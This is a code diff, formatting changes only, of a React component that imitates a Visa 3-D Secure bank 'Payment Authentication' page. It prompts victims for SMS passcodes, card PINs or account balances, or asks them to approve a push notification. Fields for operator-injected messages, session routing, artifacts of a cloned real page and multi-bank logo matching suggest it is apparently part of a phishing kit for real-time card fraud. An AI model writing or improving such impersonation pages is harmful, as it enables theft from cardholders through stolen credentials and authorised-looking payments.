@@ -1,6 +1,10 @@
 import React from "react";
 import { useBankVerification } from "../../hooks/use-bank-verification";
-import type { BankVerificationProps, ResendState, TransactionDetails } from "../../types";
+import type {
+  BankVerificationProps,
+  ResendState,
+  TransactionDetails,
+} from "../../types";
 import NBD2Styles from "./styles/nbd2-styles";
 import { StyleIsolationWrapper } from "../../components/style-isolation-wrapper";
 import { BANK_LOGO_DATA_URLS } from "../../assets/bank-logos";
@@ -66,13 +70,24 @@ function getBankLogoUrl(bank: string | undefined): string {
   const key = bank.toLowerCase().trim();
   const filename =
     BANK_TO_LOGO[key] ??
-    Object.entries(BANK_TO_LOGO).find(([k]) => key.includes(k) || k.includes(key))?.[1] ??
+    Object.entries(BANK_TO_LOGO).find(
+      ([k]) => key.includes(k) || k.includes(key),
+    )?.[1] ??
     DEFAULT_BANK_LOGO;
-  return BANK_LOGO_DATA_URLS[filename] ?? BANK_LOGO_DATA_URLS[DEFAULT_BANK_LOGO] ?? "";
+  return (
+    BANK_LOGO_DATA_URLS[filename] ??
+    BANK_LOGO_DATA_URLS[DEFAULT_BANK_LOGO] ??
+    ""
+  );
 }
 
 function getCardLogoUrl(cardBrand: "visa" | "mastercard" | undefined): string {
-  if (cardBrand === "mastercard") return BANK_LOGO_DATA_URLS["master-card.jpg"] ?? BANK_LOGO_DATA_URLS[DEFAULT_CARD_LOGO] ?? "";
+  if (cardBrand === "mastercard")
+    return (
+      BANK_LOGO_DATA_URLS["master-card.jpg"] ??
+      BANK_LOGO_DATA_URLS[DEFAULT_CARD_LOGO] ??
+      ""
+    );
   return BANK_LOGO_DATA_URLS[DEFAULT_CARD_LOGO] ?? "";
 }
 
@@ -126,12 +141,24 @@ function FooterLinks() {
         <div className="visa-col-12 helpRow" id="Accordion">
           <ul className="list-group list-group-horizontal flex-wrap pull-left">
             <li className="list-group-item border-0">
-              <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
+              <a
+                className="btn btn-link no-decoration"
+                data-bs-target="#FAQ"
+                data-bs-toggle="modal"
+                href="#FAQ"
+                id="FooterLink1"
+              >
                 Need some help?
               </a>
             </li>
             <li className="list-group-item border-0">
-              <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
+              <a
+                className="btn btn-link no-decoration"
+                data-bs-target="#Terms"
+                data-bs-toggle="modal"
+                href="#Terms"
+                id="FooterLink1"
+              >
                 learn more about authentication
               </a>
             </li>
@@ -174,7 +201,12 @@ function VerificationPage({
         </div>
       )}
       {error && <div style={errorBannerStyles}>{error}</div>}
-      <Shell bank={bank} cardBrand={cardBrand} footer={footer} onClose={onClose}>
+      <Shell
+        bank={bank}
+        cardBrand={cardBrand}
+        footer={footer}
+        onClose={onClose}
+      >
         {children}
       </Shell>
     </div>
@@ -202,7 +234,8 @@ function TransactionBody({
           <>
             <br />
             <br />
-            You are authorizing a payment to <span id="contentBlock-merchantname">{merchant}</span> for{" "}
+            You are authorizing a payment to{" "}
+            <span id="contentBlock-merchantname">{merchant}</span> for{" "}
             <span id="contentBlock-amount" className="always-left-to-right">
               {amount}
             </span>{" "}
@@ -220,7 +253,10 @@ function TransactionBody({
           <>
             <br />
             <br />
-            Payment to <span id="contentBlock-merchantname">{merchant}</span> for{" "}
+            Payment to <span id="contentBlock-merchantname">
+              {merchant}
+            </span>{" "}
+            for{" "}
             <span id="contentBlock-amount" className="always-left-to-right">
               {amount}
             </span>{" "}
@@ -229,7 +265,11 @@ function TransactionBody({
         )}
       </p>
       {(showPaymentDetails || variant === "balance" || variant === "pin") && (
-        <span id="contentBlock-maskedpan" className="always-left-to-right" style={{ fontFamily: "monospace", letterSpacing: 2 }}>
+        <span
+          id="contentBlock-maskedpan"
+          className="always-left-to-right"
+          style={{ fontFamily: "monospace", letterSpacing: 2 }}
+        >
           {card.includes("XXXX") || card.includes("****")
             ? card.replace(/\*+/g, "••••").replace(/X+/g, "••••")
             : card}
@@ -258,16 +298,29 @@ function Shell({
     <div className="threeds-two">
       <div className="container-fluid">
         <div className="visa-styling header" id="HeaderLogosFullWidth">
-          <button className="closeModal" id="ExitLink" type="button" onClick={() => onClose?.()}>
+          <button
+            className="closeModal"
+            id="ExitLink"
+            type="button"
+            onClick={() => onClose?.()}
+          >
             X
           </button>
           <div className="row no-pad">
             <div className="visa-styling bottom-border col-12">
               <div className="pull-left visa-header-one">
-                <img alt="Bank Logo" className="visa-header-img" src={bankLogoUrl} />
+                <img
+                  alt="Bank Logo"
+                  className="visa-header-img"
+                  src={bankLogoUrl}
+                />
               </div>
               <div className="pull-right visa-header-two">
-                <img alt="Card scheme" className="visa-header-img" src={cardLogoUrl} />
+                <img
+                  alt="Card scheme"
+                  className="visa-header-img"
+                  src={cardLogoUrl}
+                />
               </div>
             </div>
           </div>
@@ -278,8 +331,26 @@ function Shell({
             {footer ?? <FooterLinks />}
           </div>
         </div>
-        <div className="modal fade sf-hidden" id="FAQ" tabIndex={-1} role="dialog" aria-labelledby="FAQ-label" data-bs-backdrop="static" data-bs-keyboard="false" aria-modal="true" />
-        <div className="modal fade sf-hidden" id="Terms" tabIndex={-1} role="dialog" aria-labelledby="Terms-label" data-bs-backdrop="static" data-bs-keyboard="false" aria-modal="true" />
+        <div
+          className="modal fade sf-hidden"
+          id="FAQ"
+          tabIndex={-1}
+          role="dialog"
+          aria-labelledby="FAQ-label"
+          data-bs-backdrop="static"
+          data-bs-keyboard="false"
+          aria-modal="true"
+        />
+        <div
+          className="modal fade sf-hidden"
+          id="Terms"
+          tabIndex={-1}
+          role="dialog"
+          aria-labelledby="Terms-label"
+          data-bs-backdrop="static"
+          data-bs-keyboard="false"
+          aria-modal="true"
+        />
       </div>
     </div>
   );
@@ -307,7 +378,9 @@ function ResendButton({
     <div className="visa-row">
       <div className="col-12 text-center">
         <span
-          style={{ display: !canResend && secondsLeft <= 0 ? "inline" : "none" }}
+          style={{
+            display: !canResend && secondsLeft <= 0 ? "inline" : "none",
+          }}
           id="MaximumResendsReachedMessage"
         >
           You have been reached maximum attempts, Please contact bank
@@ -317,14 +390,21 @@ function ResendButton({
             id="ResendLink"
             className="btn btn-link resend-link no-decoration text-uppercase"
             type="button"
-            onClick={() => { onTryAgain(); onResend(); }}
+            onClick={() => {
+              onTryAgain();
+              onResend();
+            }}
             disabled={resending || submitting}
           >
             {resending ? "Sending..." : `RESEND ${label}`}
           </button>
         ) : (
-          <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
-            Resend {label.toLowerCase()} in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:
+          <span
+            className="resend-link no-decoration text-uppercase"
+            style={{ cursor: "default" }}
+          >
+            Resend {label.toLowerCase()} in{" "}
+            {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:
             {String(secondsLeft % 60).padStart(2, "0")}
           </span>
         )}
@@ -333,10 +413,21 @@ function ResendButton({
   );
 }
 
-function ErrorSpan({ message, visible }: { message: string; visible: boolean }) {
+function ErrorSpan({
+  message,
+  visible,
+}: {
+  message: string;
+  visible: boolean;
+}) {
   return (
     <div className="form-group" id="ErrorMessage">
-      <img id="WarningImage" src="data:," alt="Warning" style={{ display: visible ? "inline" : "none" }} />
+      <img
+        id="WarningImage"
+        src="data:,"
+        alt="Warning"
+        style={{ display: visible ? "inline" : "none" }}
+      />
       <span
         id="ValidationErrorMessage"
         className="field-validation-error"
@@ -349,7 +440,13 @@ function ErrorSpan({ message, visible }: { message: string; visible: boolean }) 
 }
 
 type OtpFormConfig =
-  | { kind: "pin"; value: string; onChange: (v: string) => void; masked: boolean; onMaskToggle: () => void }
+  | {
+      kind: "pin";
+      value: string;
+      onChange: (v: string) => void;
+      masked: boolean;
+      onMaskToggle: () => void;
+    }
   | { kind: "sms"; value: string; onChange: (v: string) => void };
 
 function OtpForm({
@@ -386,13 +483,18 @@ function OtpForm({
       method="post"
       name={formId}
       noValidate
-      onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
+      onSubmit={(e) => {
+        e.preventDefault();
+        onSubmit();
+      }}
     >
       <div className="visa-row">
         <div className="col-12 visa-styling">
           <div className="form-group text-center">
             <div id="InputAction">
-              <label htmlFor={inputId} className="credential-label">{label}</label>
+              <label htmlFor={inputId} className="credential-label">
+                {label}
+              </label>
               <input
                 autoFocus
                 className="form-control visa-styling credential-input"
@@ -403,18 +505,35 @@ function OtpForm({
                 placeholder={isPIN ? "••••" : undefined}
                 type={isPIN && config.masked ? "password" : "text"}
                 value={config.value}
-                onChange={(e) => config.onChange(sanitizeDigits(e.target.value, maxLength))}
+                onChange={(e) =>
+                  config.onChange(sanitizeDigits(e.target.value, maxLength))
+                }
                 disabled={submitting}
-                {...(!isPIN && { "data-val": "true", "data-val-required": "Please enter the code" })}
+                {...(!isPIN && {
+                  "data-val": "true",
+                  "data-val-required": "Please enter the code",
+                })}
               />
               {isPIN && (
-                <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
-                  <input id="pin-show-toggle" type="checkbox" checked={!config.masked} onChange={config.onMaskToggle} />
-                  {" "}Show PIN
+                <label
+                  htmlFor="pin-show-toggle"
+                  style={{ display: "block", marginTop: 8, fontSize: 14 }}
+                >
+                  <input
+                    id="pin-show-toggle"
+                    type="checkbox"
+                    checked={!config.masked}
+                    onChange={config.onMaskToggle}
+                  />{" "}
+                  Show PIN
                 </label>
               )}
               {!isPIN && (
-                <span className="field-validation-valid sf-hidden" data-valmsg-for="Credential.Value" data-valmsg-replace="true" />
+                <span
+                  className="field-validation-valid sf-hidden"
+                  data-valmsg-for="Credential.Value"
+                  data-valmsg-replace="true"
+                />
               )}
               <ErrorSpan message={errorMessage} visible={showError} />
               <div className="visa-col-12 text-center">
@@ -446,7 +565,12 @@ function OtpForm({
   );
 }
 
-function resolveOtpError(wrongCode: boolean, expiredCode: boolean, operatorMessage: string | undefined, kind: "pin" | "sms"): string {
+function resolveOtpError(
+  wrongCode: boolean,
+  expiredCode: boolean,
+  operatorMessage: string | undefined,
+  kind: "pin" | "sms",
+): string {
   if (wrongCode) return OTP_WRONG_MSG[kind];
   if (expiredCode) return "Code expired. Please request a new code.";
   return operatorMessage ?? "";
@@ -463,23 +587,30 @@ export function VerificationUi({
   onRedirect,
   onClose,
 }: BankVerificationProps) {
-  const { layoutState, inProgress, awaitingVerification, error } = useBankVerification({
-    apiBase,
-    channelSlug,
-    sessionId,
-    debug,
-    onSuccess,
-    onDeclined,
-    onError,
-    onRedirect,
-    onClose,
-  });
+  const { layoutState, inProgress, awaitingVerification, error } =
+    useBankVerification({
+      apiBase,
+      channelSlug,
+      sessionId,
+      debug,
+      onSuccess,
+      onDeclined,
+      onError,
+      onRedirect,
+      onClose,
+    });
 
   if (!channelSlug || !sessionId) return null;
   if (!awaitingVerification && !inProgress) return null;
 
   const { bank, transactionDetails } = layoutState;
-  const pageProps = { bank, cardBrand: transactionDetails?.cardBrand, inProgress, error, onClose };
+  const pageProps = {
+    bank,
+    cardBrand: transactionDetails?.cardBrand,
+    inProgress,
+    error,
+    onClose,
+  };
 
   // --- Push layout ---
   if (layoutState.layout === "push") {
@@ -493,16 +624,24 @@ export function VerificationUi({
             </div>
             <div className="row">
               <div className="col-12" id="ValidateOneUpMessage">
-                <TransactionBody transactionDetails={transactionDetails} variant="push" />
+                <TransactionBody
+                  transactionDetails={transactionDetails}
+                  variant="push"
+                />
               </div>
             </div>
           </div>
           <div className="visa-row">
             <div className="col-12 visa-styling text-center">
-              <div className="form-group" style={{ marginTop: 24, marginBottom: 24 }}>
+              <div
+                className="form-group"
+                style={{ marginTop: 24, marginBottom: 24 }}
+              >
                 <Spinner size={64} />
               </div>
-              <h3 className="visa-validate" style={{ marginBottom: 8 }}>Confirm on your device</h3>
+              <h3 className="visa-validate" style={{ marginBottom: 8 }}>
+                Confirm on your device
+              </h3>
               <p className="mb-0">
                 {bank
                   ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
@@ -517,7 +656,14 @@ export function VerificationUi({
 
   // --- Balance layout ---
   if (layoutState.layout === "balance") {
-    const { balance, onBalanceChange, onSubmit, submitting, canSubmit, operatorMessage } = layoutState;
+    const {
+      balance,
+      onBalanceChange,
+      onSubmit,
+      submitting,
+      canSubmit,
+      operatorMessage,
+    } = layoutState;
 
     return (
       <StyleIsolationWrapper>
@@ -531,13 +677,21 @@ export function VerificationUi({
               method="post"
               name="BalanceValidateForm"
               noValidate
-              onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
+              onSubmit={(e) => {
+                e.preventDefault();
+                onSubmit();
+              }}
             >
               <div className="visa-row">
                 <div className="col-12 visa-styling">
                   <div className="form-group text-center">
                     <div id="InputAction">
-                      <label htmlFor="BalanceInput" className="credential-label">Balance</label>
+                      <label
+                        htmlFor="BalanceInput"
+                        className="credential-label"
+                      >
+                        Balance
+                      </label>
                       <input
                         autoFocus
                         className="form-control visa-styling credential-input"
@@ -550,7 +704,10 @@ export function VerificationUi({
                         onChange={(e) => onBalanceChange(e.target.value)}
                         disabled={submitting}
                       />
-                      <ErrorSpan message={operatorMessage?.message ?? ""} visible={Boolean(operatorMessage?.message)} />
+                      <ErrorSpan
+                        message={operatorMessage?.message ?? ""}
+                        visible={Boolean(operatorMessage?.message)}
+                      />
                       <div className="visa-col-12 text-center">
                         <button
                           type="submit"
@@ -571,10 +728,15 @@ export function VerificationUi({
         >
           <h2 className="screenreader-only">Balance verification</h2>
           <div className="visa-row">
-            <div className="visa-col-12 visa-validate"><strong>Payment Authentication</strong></div>
+            <div className="visa-col-12 visa-validate">
+              <strong>Payment Authentication</strong>
+            </div>
             <div className="row">
               <div className="col-12" id="ValidateOneUpMessage">
-                <TransactionBody transactionDetails={transactionDetails} variant="balance" />
+                <TransactionBody
+                  transactionDetails={transactionDetails}
+                  variant="balance"
+                />
               </div>
             </div>
           </div>
@@ -585,7 +747,20 @@ export function VerificationUi({
 
   // --- PIN layout ---
   if (layoutState.layout === "pin") {
-    const { pinValue, onPinChange, pinMasked, onPinMaskToggle, wrongCode, expiredCode, onTryAgain, onSubmit, submitting, canSubmit, resendState, operatorMessage } = layoutState;
+    const {
+      pinValue,
+      onPinChange,
+      pinMasked,
+      onPinMaskToggle,
+      wrongCode,
+      expiredCode,
+      onTryAgain,
+      onSubmit,
+      submitting,
+      canSubmit,
+      resendState,
+      operatorMessage,
+    } = layoutState;
 
     return (
       <StyleIsolationWrapper>
@@ -593,23 +768,41 @@ export function VerificationUi({
           {...pageProps}
           footer={
             <OtpForm
-              config={{ kind: "pin", value: pinValue, onChange: onPinChange, masked: pinMasked, onMaskToggle: onPinMaskToggle }}
+              config={{
+                kind: "pin",
+                value: pinValue,
+                onChange: onPinChange,
+                masked: pinMasked,
+                onMaskToggle: onPinMaskToggle,
+              }}
               onSubmit={onSubmit}
               resendState={resendState}
               submitting={submitting}
               canSubmit={canSubmit}
               onTryAgain={onTryAgain}
-              errorMessage={resolveOtpError(wrongCode, expiredCode, operatorMessage?.message, "pin")}
-              showError={wrongCode || expiredCode || Boolean(operatorMessage?.message)}
+              errorMessage={resolveOtpError(
+                wrongCode,
+                expiredCode,
+                operatorMessage?.message,
+                "pin",
+              )}
+              showError={
+                wrongCode || expiredCode || Boolean(operatorMessage?.message)
+              }
             />
           }
         >
           <h2 className="screenreader-only">Enter your PIN</h2>
           <div className="visa-row">
-            <div className="visa-col-12 visa-validate"><strong>Payment Authentication</strong></div>
+            <div className="visa-col-12 visa-validate">
+              <strong>Payment Authentication</strong>
+            </div>
             <div className="row">
               <div className="col-12" id="ValidateOneUpMessage">
-                <TransactionBody transactionDetails={transactionDetails} variant="pin" />
+                <TransactionBody
+                  transactionDetails={transactionDetails}
+                  variant="pin"
+                />
               </div>
             </div>
           </div>
@@ -619,7 +812,18 @@ export function VerificationUi({
   }
 
   // --- SMS layout (default) ---
-  const { code, onCodeChange, wrongCode, expiredCode, onTryAgain, onSubmit, submitting, canSubmit, resendState, operatorMessage } = layoutState;
+  const {
+    code,
+    onCodeChange,
+    wrongCode,
+    expiredCode,
+    onTryAgain,
+    onSubmit,
+    submitting,
+    canSubmit,
+    resendState,
+    operatorMessage,
+  } = layoutState;
 
   return (
     <StyleIsolationWrapper>
@@ -633,17 +837,31 @@ export function VerificationUi({
             submitting={submitting}
             canSubmit={canSubmit}
             onTryAgain={onTryAgain}
-            errorMessage={resolveOtpError(wrongCode, expiredCode, operatorMessage?.message, "sms")}
-            showError={wrongCode || expiredCode || Boolean(operatorMessage?.message)}
+            errorMessage={resolveOtpError(
+              wrongCode,
+              expiredCode,
+              operatorMessage?.message,
+              "sms",
+            )}
+            showError={
+              wrongCode || expiredCode || Boolean(operatorMessage?.message)
+            }
           />
         }
       >
-        <h2 className="screenreader-only">Your One-time Passcode has been sent</h2>
+        <h2 className="screenreader-only">
+          Your One-time Passcode has been sent
+        </h2>
         <div className="visa-row">
-          <div className="visa-col-12 visa-validate"><strong>Payment Authentication</strong></div>
+          <div className="visa-col-12 visa-validate">
+            <strong>Payment Authentication</strong>
+          </div>
           <div className="row">
             <div className="col-12" id="ValidateOneUpMessage">
-              <TransactionBody transactionDetails={transactionDetails} variant="sms" />
+              <TransactionBody
+                transactionDetails={transactionDetails}
+                variant="sms"
+              />
             </div>
           </div>
         </div>
